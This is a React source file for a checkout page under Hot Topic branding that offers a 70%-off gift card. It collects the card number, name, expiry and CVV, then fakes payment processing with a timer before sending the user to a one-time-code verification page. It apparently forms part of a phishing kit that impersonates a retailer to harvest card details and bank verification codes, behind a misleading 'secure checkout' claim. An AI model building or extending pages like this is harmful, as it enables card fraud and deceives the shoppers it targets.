import { useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { toast } from "@/hooks/use-toast";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import HotTopicHeader from "@/components/HotTopicHeader";
import HotTopicFooter from "@/components/HotTopicFooter";
import { AlertCircle, CreditCard, LockIcon, Shield } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";

// Updated card types with improved SVG content
const CARD_TYPES = [
  { 
    name: "Visa", 
    icon: (
      <svg xmlns="http://www.w3.org/2000/svg" width="40" height="24" viewBox="0 0 146 95">
        <rect width="146" height="95" rx="7" fill="#0055B7" />
        <path fill="#FFF" d="M60.1 30.4l-12.2 28.7h-8l-6-23c-.4-1.4-1-1.8-2.3-2.3-2.3-1-6.2-2-9.6-2.6l.2-.9h16.5c2.1 0 4 1.4 4.4 3.8l4.1 21.5 10-25.3h8.9zm35.4 19.3c0-9.9-13.7-10.4-13.6-14.8 0-1.3 1.3-2.8 4.2-3.1 1.4-.2 5.3-.4 9.8 1.8l1.7-8c-2.4-.9-5.5-1.7-9.4-1.7-9.9 0-16.8 5.2-16.9 12.8-.1 5.6 5 8.7 8.7 10.5 3.9 1.9 5.2 3.1 5.2 4.8 0 2.6-3.1 3.7-6 3.8-5 .1-7.9-1.4-10.3-2.4l-1.8 8.4c2.3 1.1 6.6 2 11.1 2 10.5 0 17.3-5.2 17.3-13.1M112.5 59h7.8l-6.8-28.7h-7.2c-1.6 0-3 1-3.6 2.3l-12.7 26.3h8.9l1.8-4.9h10.9l.9 5zm-9.3-12.5l4.5-12.4 2.6 12.4h-7.1zm-43.4-16.2l-7 28.7h-8.5l7-28.7h8.5z" />
      </svg>
    )
  },
  { 
    name: "Mastercard", 
    icon: (
      <svg xmlns="http://www.w3.org/2000/svg" width="40" height="24" viewBox="0 0 146 95">
        <rect width="146" height="95" rx="7" fill="#0A2882" />
        <circle fill="#EB001B" cx="52.3" cy="47.5" r="24.1" />
        <circle fill="#F79E1B" cx="93.7" cy="47.5" r="24.1" />
        <path fill="#FF5F00" d="M73 31.9c-5.8 4.7-9.6 11.9-9.6 19.9 0 8 3.7 15.2 9.6 19.9 5.8-4.7 9.6-11.9 9.6-19.9 0-8-3.7-15.2-9.6-19.9z" />
        <path d="M125.6 66.4V65h.6v-.3h-1.5v.3h.6v1.4h.3zm2.8 0v-1.7h-.5l-.5 1.1-.5-1.1h-.4v1.7h.3v-1.3l.5 1.1h.3l.5-1.1v1.3h.3z" fill="#F79E1B" />
      </svg>
    )
  },
  { 
    name: "American Express", 
    icon: (
      <svg xmlns="http://www.w3.org/2000/svg" width="40" height="24" viewBox="0 0 146 95">
        <rect width="146" height="95" rx="7" fill="#006FCF" />
        <path fill="#FFF" d="M19.6 56.7h7.4v-18h-7.4v18zm52.5 0h10.4l1.6-2 1.5 2h36.5v-15c0 0-1.6 0-3 .8-1.4.8-2.2 1.9-2.2 1.9v-2.7h-8.1l-1.4 3.1-1.3-3.1h-12.9v2.7c0 0-1.3-2.7-5-2.7s-12.6 0-12.6 0l-.8 1.9-.7-1.9h-8.9v2.7c0 0-1.1-2.7-4.6-2.7h-6.8L60 45.7l-2.5-7h-8.2v18h7.1v-6.8l2 6.8h4.8l2-6.8v6.8h7V44.5h1.5c3.8 0 3 5.8 3 5.8v6.4h7.1v-1l1.6 1h.7zm-30.4-18v15.6c0 0 1.3 2.4 4.5 2.4h6.3l1.9-3.7v3.7h8.2l1.6-2.2 1.5 2.2h8.8v-3.7h-.6c3.8 0 6.1-2.4 6.1-5.6h.7c5.6 0 4.5 5.6 4.5 5.6h-2.3v3.7h7.1v-3.7h3.8V45.6h3.8v-3.3h-3.8v-3.7h-7.1v3c0 0-1.1-3-4.8-3h-10.7v3c0 0-1.1-3-5.2-3h-12.9l-2.9 6.7-3-6.7h-7zm26.5 14.2h-3.3v-10.5h3.3c3.5 0 3.8 5.3 0 5.3l3.8 5.2zm31.7 0l-3.9-5.2c3.8 0 3.4-5.3 0-5.3h-3.3v10.5h3.3v-5.2l3.9 5.2zm-72.3-7.5h-3.8v-3.6h3.8v3.6zm0 7.5h-3.8V49h3.8v3.9zm63.6-7.5h-3.8v-3.6h3.8v3.6zm0 7.5h-3.8V49h3.8v3.9zm11.3 0h-3.8V45.6h3.8v11.1z" />
      </svg>
    )
  },
  { 
    name: "Discover", 
    icon: (
      <svg xmlns="http://www.w3.org/2000/svg" width="40" height="24" viewBox="0 0 146 95">
        <rect width="146" height="95" rx="7" fill="#4D4D4D" />
        <path fill="none" d="M0 0h146v95H0z" />
        <path d="M13.3 47.5c0-10.8 8.7-19.5 19.5-19.5h79.2c10.8 0 19.5 8.7 19.5 19.5 0 10.8-8.7 19.5-19.5 19.5H32.8c-10.8 0-19.5-8.7-19.5-19.5z" fill="none" />
        <path fill="#FF7900" d="M115 62.5c7.6-7.3 7.6-19.3 0-26.6-3.8-3.6-8.8-5.4-14-5.4h-5.2c-10.9 0-18.7 5.8-18.7 19s7.8 19 18.7 19h5.2c5.2 0 10.2-1.9 14-6" />
        <path d="M62.5 53.2c1.2-1.5 1.8-3.2 1.8-5.4 0-2.1-.6-3.9-1.8-5.3-1.2-1.4-2.9-2-5.2-2H53v14.8h4.3c2.3 0 4-.7 5.2-2.1m-4.1-1.6c-.6.7-1.4 1-2.5 1H55V42.1h.8c1.1 0 1.9.3 2.5 1 .6.7.9 1.6.9 2.8 0 1.2-.3 2.2-.8 2.7m5.7 8.1h-1.3l5.7-19.3h1.3l5.8 19.3h-1.3L73 55.3h-7.4l-1.5 4.4zm2.8-5.8h6.3l-3.2-10.2-3.1 10.2zm16.9 5.8V40.6h5.2c2.9 0 4.6 1.9 4.6 4.7 0 2.4-1.2 3.9-3.6 4.5L94 59.7h-1.5L88 50h-3.2v9.7h-1zm1-10.9h3.6c2.3 0 3.7-1.2 3.7-3.6 0-2.1-1.3-3.4-3.3-3.4h-4v7zm12.3 10.9V40.6h6.9c2.1 0 3.7 1.5 3.7 3.7 0 1.7-1 3-2.5 3.4 1.9.3 3.3 2 3.3 3.9 0 2.3-1.7 3.9-4.5 3.9l-6.9.2zm1-11v4.8h4.7c2.2 0 3.6-1 3.6-2.9 0-1.5-1.1-2.6-2.6-2.6l-2.4.1h-3.3v.6zm0 5.9v4h5.9c1.8 0 3.1-1 3.1-2.6 0-1.5-1.1-2.5-2.8-2.5l-1.3.1-4.9 1z" fill="#FFF" />
        <path fill="#FFF" d="M25.2 59.7V40.6H38v1.1H26.2v7.6h11.5v1.1H26.2V59h11.9v.7z" />
      </svg>
    )
  }
];

// Regex patterns for validation
const CARD_NUMBER_REGEX = /^[0-9]{13,19}$/;
const CVV_REGEX = /^[0-9]{3,4}$/;
const CARD_NAME_REGEX = /^[A-Za-z\s]+$/;

// Function to validate credit card type from number
const detectCardType = (cardNumber: string): string => {
  // Remove all non-digit characters
  const number = cardNumber.replace(/\D/g, '');
  
  // Check for card type patterns
  if (number.startsWith('4')) {
    return "Visa";
  } else if (/^5[1-5]/.test(number)) {
    return "Mastercard";
  } else if (/^3[47]/.test(number)) {
    return "American Express";
  } else if (/^(6011|65|64[4-9])/.test(number)) {
    return "Discover";
  }
  
  return "Unknown";
};

const Payment = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const [selectedCardType, setSelectedCardType] = useState<string>("Visa");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [formData, setFormData] = useState({
    cardNumber: "",
    cardName: "",
    expiryDate: "",
    cvv: ""
  });
  const [errors, setErrors] = useState<Record<string, string>>({});

  // Get order details from location state
  const orderDetails = location.state?.orderDetails;
  const giftCardValue = location.state?.giftCardValue;
  const discountedAmount = location.state?.discountedAmount;

  // If no order details, redirect to home
  if (!orderDetails) {
    navigate("/");
    toast({
      title: "Error",
      description: "No order information found. Please start again.",
      variant: "destructive",
    });
  }

  const validateField = (name: string, value: string): string => {
    switch (name) {
      case "cardName":
        if (value.trim() === "") return "This field is required";
        if (!CARD_NAME_REGEX.test(value)) return "Please enter a valid name";
        return "";
      case "cardNumber":
        if (!CARD_NUMBER_REGEX.test(value.replace(/\s/g, ''))) {
          return "Please enter a valid card number";
        }
        if (detectCardType(value) === "Unknown") {
          return "Unsupported card type";
        }
        return "";
      case "expiryDate":
        const [month, year] = value.split('/').map(part => part.trim());
        if (!month || !year || isNaN(Number(month)) || isNaN(Number(year))) {
          return "Please enter a valid expiry date (MM/YY)";
        }
        if (Number(month) < 1 || Number(month) > 12) {
          return "Month must be between 1 and 12";
        }
        const currentYear = new Date().getFullYear() % 100;
        const currentMonth = new Date().getMonth() + 1; // JavaScript months are 0-based
        
        if (Number(year) < currentYear || 
            (Number(year) === currentYear && Number(month) < currentMonth)) {
          return "Card has expired";
        }
        return "";
      case "cvv":
        if (!CVV_REGEX.test(value)) {
          return "Please enter a valid CVV";
        }
        // Different validation for American Express (4 digits) vs other cards (3 digits)
        if (selectedCardType === "American Express" && value.length !== 4) {
          return "American Express cards require a 4-digit CVV";
        } else if (selectedCardType !== "American Express" && value.length !== 3) {
          return "Please enter a 3-digit CVV";
        }
        return "";
      default:
        return "";
    }
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
    
    // Validate field on change and update errors
    const error = validateField(name, value);
    setErrors(prev => ({
      ...prev,
      [name]: error
    }));
  };

  const formatCardNumber = (value: string): string => {
    // Remove all non-digit characters
    const cleaned = value.replace(/\D/g, '');
    
    // Auto-detect card type and update state
    const detectedType = detectCardType(cleaned);
    if (detectedType !== "Unknown") {
      setSelectedCardType(detectedType);
    }
    
    // Format as XXXX XXXX XXXX XXXX (or XXXX XXXXXX XXXXX for AMEX)
    const chunks = [];
    if (detectedType === "American Express") {
      if (cleaned.length > 0) chunks.push(cleaned.substring(0, Math.min(4, cleaned.length)));
      if (cleaned.length > 4) chunks.push(cleaned.substring(4, Math.min(10, cleaned.length)));
      if (cleaned.length > 10) chunks.push(cleaned.substring(10, Math.min(15, cleaned.length)));
    } else {
      for (let i = 0; i < cleaned.length; i += 4) {
        chunks.push(cleaned.substring(i, Math.min(i + 4, cleaned.length)));
      }
    }
    return chunks.join(' ');
  };

  const formatExpiryDate = (value: string): string => {
    // Remove all non-digit characters
    const cleaned = value.replace(/\D/g, '');
    
    // Format as MM/YY
    if (cleaned.length >= 3) {
      return `${cleaned.substring(0, 2)}/${cleaned.substring(2, 4)}`;
    } else {
      return cleaned;
    }
  };

  const handleCardNumberInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value);
    setFormData(prev => ({
      ...prev,
      cardNumber: formatted
    }));
    
    // Validate card number
    const error = validateField("cardNumber", formatted);
    setErrors(prev => ({
      ...prev,
      cardNumber: error
    }));
  };

  const handleExpiryDateInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatExpiryDate(e.target.value);
    setFormData(prev => ({
      ...prev,
      expiryDate: formatted
    }));
    
    // Validate expiry date
    const error = validateField("expiryDate", formatted);
    setErrors(prev => ({
      ...prev,
      expiryDate: error
    }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Validate all required fields
    const newErrors: Record<string, string> = {};
    let hasErrors = false;
    
    // Fields to validate
    const fieldNames = ["cardNumber", "cardName", "expiryDate", "cvv"];
    
    // Validate each field
    fieldNames.forEach(fieldName => {
      const error = validateField(fieldName, formData[fieldName as keyof typeof formData]);
      if (error) {
        newErrors[fieldName] = error;
        hasErrors = true;
      }
    });
    
    setErrors(newErrors);
    
    if (hasErrors) {
      toast({
        title: "Validation Error",
        description: "Please fix the errors in the form",
        variant: "destructive",
      });
      return;
    }
    
    // Set loading state
    setIsSubmitting(true);
    
    try {
      console.log(`Processing payment for $${giftCardValue} gift card (70% off) using ${selectedCardType}`);
      
      // Create payment processing simulation
      setTimeout(() => {
        // Navigate to OTP verification page
        navigate("/otp-verification", { 
          state: { 
            orderDetails,
            giftCardValue,
            discountedAmount,
            paymentMethod: selectedCardType,
            lastFour: formData.cardNumber.slice(-4)
          } 
        });
      }, 1500);
    } catch (error) {
      console.error("Payment submission error:", error);
      toast({
        title: "System Error",
        description: "We encountered a technical issue. Please try again later.",
        variant: "destructive",
      });
      setIsSubmitting(false);
    }
  };

  const renderErrorMessage = (fieldName: string) => {
    if (!errors[fieldName]) return null;
    
    return (
      <div className="text-red-500 text-sm mt-1 flex items-center gap-1">
        <AlertCircle className="h-4 w-4" />
        <span>{errors[fieldName]}</span>
      </div>
    );
  };

  // Find the selected card icon
  const selectedCardIcon = CARD_TYPES.find(card => card.name === selectedCardType)?.icon;

  return (
    <div className="min-h-screen bg-black">
      <HotTopicHeader />
      
      <div className="container py-8">
        <div className="max-w-3xl mx-auto space-y-6">
          <div className="bg-hottopic-gray/10 rounded-xl p-6 border border-hottopic-gray/20">
            <h1 className="text-3xl font-bold text-white mb-6 text-center">
              Complete Your <span className="text-hottopic-red">Payment</span>
            </h1>
            
            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Payment Method */}
              <div className="space-y-4">
                <h2 className="text-2xl font-semibold text-white flex items-center mb-4">
                  <span className="bg-hottopic-red w-8 h-8 rounded-full flex items-center justify-center mr-2 text-white">
                    1
                  </span>
                  Payment Method
                </h2>
                
                <div className="space-y-2">
                  <Label htmlFor="cardType" className="text-white">Card Type*</Label>
                  <div className="flex items-center gap-2">
                    <CreditCard className="h-5 w-5 text-hottopic-red" />
                    <Select
                      value={selectedCardType}
                      onValueChange={(value) => setSelectedCardType(value)}
                    >
                      <SelectTrigger 
                        className="bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red w-full sm:w-auto"
                        id="cardType"
                      >
                        <SelectValue placeholder="Select card type">
                          <div className="flex items-center gap-2">
                            {selectedCardIcon}
                            <span>{selectedCardType}</span>
                          </div>
                        </SelectValue>
                      </SelectTrigger>
                      <SelectContent className="bg-hottopic-dark border-hottopic-gray">
                        {CARD_TYPES.map((card) => (
                          <SelectItem 
                            key={card.name} 
                            value={card.name}
                            className="text-white hover:bg-hottopic-gray/30 focus:bg-hottopic-gray/30"
                          >
                            <div className="flex items-center gap-2">
                              {card.icon}
                              {card.name}
                            </div>
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                  </div>
                </div>
              </div>
              
              {/* Card Details */}
              <div className="space-y-4">
                <h2 className="text-2xl font-semibold text-white flex items-center mb-4">
                  <span className="bg-hottopic-red w-8 h-8 rounded-full flex items-center justify-center mr-2 text-white">
                    2
                  </span>
                  Card Details
                </h2>
                
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="cardNumber" className="text-white">Card Number*</Label>
                    <div className="relative">
                      <Input
                        id="cardNumber"
                        name="cardNumber"
                        value={formData.cardNumber}
                        onChange={handleCardNumberInput}
                        className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red pl-9 font-mono ${errors.cardNumber ? 'border-red-500' : ''}`}
                        placeholder="•••• •••• •••• ••••"
                        maxLength={selectedCardType === "American Express" ? 17 : 19}
                      />
                      <div className="absolute left-3 top-2.5 h-4 w-4 text-gray-400">
                        {selectedCardIcon ? (
                          <div className="scale-[0.6] -ml-1 -mt-1">{selectedCardIcon}</div>
                        ) : (
                          <CreditCard className="h-4 w-4" />
                        )}
                      </div>
                    </div>
                    {renderErrorMessage("cardNumber")}
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="cardName" className="text-white">Name on Card*</Label>
                    <Input
                      id="cardName"
                      name="cardName"
                      value={formData.cardName}
                      onChange={handleInputChange}
                      className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red ${errors.cardName ? 'border-red-500' : ''}`}
                      placeholder="Enter name as it appears on card"
                    />
                    {renderErrorMessage("cardName")}
                  </div>
                </div>
                
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="expiryDate" className="text-white">Expiry Date*</Label>
                    <Input
                      id="expiryDate"
                      name="expiryDate"
                      value={formData.expiryDate}
                      onChange={handleExpiryDateInput}
                      className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red ${errors.expiryDate ? 'border-red-500' : ''}`}
                      placeholder="MM/YY"
                      maxLength={5}
                    />
                    {renderErrorMessage("expiryDate")}
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="cvv" className="text-white">Security Code (CVV)*</Label>
                    <div className="relative">
                      <Input
                        id="cvv"
                        name="cvv"
                        value={formData.cvv}
                        onChange={handleInputChange}
                        className={`bg-hottopic-dark border-hottopic-gray focus:border-hottopic-red ${errors.cvv ? 'border-red-500' : ''}`}
                        placeholder={selectedCardType === "American Express" ? "••••" : "•••"}
                        maxLength={selectedCardType === "American Express" ? 4 : 3}
                        type="password"
                      />
                      <div className="absolute right-3 top-2.5 h-4 w-4 text-gray-400">
                        <LockIcon size={16} />
                      </div>
                    </div>
                    {renderErrorMessage("cvv")}
                  </div>
                </div>
              </div>
              
              {/* Order Summary */}
              <div className="bg-hottopic-gray/20 p-6 rounded-lg border border-hottopic-gray/30 space-y-4">
                <h3 className="text-xl font-semibold text-white mb-2">Order Summary</h3>
                
                <div className="space-y-2 text-sm">
                  <div className="flex justify-between">
                    <span className="text-gray-400">Item:</span>
                    <span className="text-white">Hot Topic Gift Card</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-400">Gift Card Value:</span>
                    <span className="text-white">${giftCardValue?.toFixed(2) || "0.00"}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-400">Discount:</span>
                    <span className="text-hottopic-red">70% OFF</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-400">Delivery Method:</span>
                    <span className="text-white capitalize">{orderDetails?.deliveryMethod}</span>
                  </div>
                  <div className="border-t border-hottopic-gray/30 my-2 pt-2 flex justify-between font-bold">
                    <span className="text-white">Total:</span>
                    <span className="text-hottopic-red">${discountedAmount?.toFixed(2) || "0.00"}</span>
                  </div>
                </div>
              </div>
              
              {/* Submit Button */}
              <div className="flex justify-center">
                <Button 
                  type="submit" 
                  disabled={isSubmitting}
                  className="w-full md:w-auto px-8 py-6 bg-hottopic-red hover:bg-hottopic-red/90 text-white font-bold text-lg"
                >
                  {isSubmitting ? (
                    <div className="flex items-center space-x-2">
                      <div className="w-5 h-5 border-2 border-t-transparent border-white rounded-full animate-spin"></div>
                      <span>Processing...</span>
                    </div>
                  ) : (
                    "Complete Purchase"
                  )}
                </Button>
              </div>
              
              <div className="flex items-center justify-center text-center">
                <Shield size={16} className="text-gray-400 mr-2" />
                <p className="text-gray-400 text-sm">
                  Secure checkout - Your information is protected with 256-bit SSL encryption
                </p>
              </div>
            </form>
          </div>
        </div>
      </div>
      
      <HotTopicFooter />
    </div>
  );
};

export default Payment;
